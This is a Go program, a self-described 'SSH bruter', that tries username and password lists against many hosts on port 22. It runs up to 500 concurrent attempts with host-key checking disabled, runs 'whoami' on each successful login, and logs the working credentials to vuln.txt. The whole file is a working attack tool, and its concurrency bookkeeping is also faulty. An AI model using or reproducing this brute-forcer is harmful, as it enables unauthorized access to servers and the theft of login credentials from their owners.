/* 
*  SSH bruter in go 
*/ 

package main 

import (

	"fmt"
	"strings"
	"io/ioutil"
	"golang.org/x/crypto/ssh"
	"os"
	"sync"
	"time"
    "bufio"
	"bytes"

)

var waitG sync.WaitGroup
const LIMIT = 500
var throttler = make(chan int, LIMIT)


func connect(ip, user, pass string) {
	
	host := ip + ":22"

    fmt.Println("Trying: "+host+" "+user+" "+pass)

    sshConfig := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		Timeout:         10 * time.Second,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	sshConfig.SetDefaults()
	
	c, err := ssh.Dial("tcp", host, sshConfig)
	if err != nil {
		<-throttler
		return
	}
	defer c.Close()
		
	session, err := c.NewSession()
	if err == nil {
		defer session.Close()

		var s_out bytes.Buffer
		session.Stdout = &s_out

		if err = session.Run("whoami"); err == nil {
			fmt.Printf("Got a user! %s %s:%s\n", host, user, pass)
			fmt.Println(s_out.String())
			f, err := os.OpenFile("vuln.txt", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
            if err != nil {
               panic(err)
            }

            defer f.Close()

            if _, err = f.WriteString(host+":"+user+":"+pass+"\n"); err != nil {
                 panic(err)
            }


		}
	}

	<-throttler
	

	waitG.Done()

}

func readFile(f string) (data []string, err error) {
	b, err := os.Open(f)
	if err != nil {
		return
	}
	defer b.Close()

	scanner := bufio.NewScanner(b)
	for scanner.Scan() {
		data = append(data, scanner.Text())
	}
	return
}

func main() {
    
	content, err := ioutil.ReadFile("sshs.txt")
    if err != nil {
		fmt.Println(err)
    }

    users, err := readFile("users.txt")
	if err != nil {
		fmt.Println("Can't read user list, exiting.")
		os.Exit(1)
	}

	passwords, err := readFile("passwords.txt")
	if err != nil {
		fmt.Println("Can't read passwords list, exiting.")
		os.Exit(1)
	}

    lines := strings.Split(string(content), "\n")
    i := len(lines)
	
    waitG.Add(i) 

 	for j := range lines {

		for _, user := range users {
			for _, pass := range passwords {
				go connect(lines[j], user, pass)
				throttler <- 0
				
	
			}
		}

	}
	

    waitG.Wait()
}
